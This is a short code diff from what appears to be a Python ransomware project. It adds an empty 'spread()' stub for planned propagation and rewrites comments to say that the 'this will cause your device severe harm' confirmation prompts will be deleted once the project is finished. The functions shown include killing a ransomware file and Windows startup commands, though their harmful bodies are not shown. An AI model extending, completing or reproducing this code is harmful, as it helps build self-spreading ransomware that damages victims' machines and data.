@@ -39,6 +39,10 @@ def kill_ransomware_file():
         os.remove(ransomware_file)
     except:
         sys.exit()
+        
+def spread():
+    # To be implemented
+    pass
 
 def startup_commands_windows():
     win_commands = [
@@ -191,6 +195,6 @@ def main():
     launch_gui()
 
 if __name__ == "__main__":
-    input("ARE YOU SURE YOU WANT TO LAUNCH? THIS WILL CAUSE YOUR DEVICE SEVERE HARM!!! -> Final Warning") # to delete
-    input("Press any key again to confirm, this is to prevent accidental execution on main machine") # to delete
+    input("ARE YOU SURE YOU WANT TO LAUNCH? THIS WILL CAUSE YOUR DEVICE SEVERE HARM!!! -> Final Warning") # will delete when project is finished
+    input("Press any key again to confirm, this is to prevent accidental execution on main machine") # will delete when project is finished
     main()
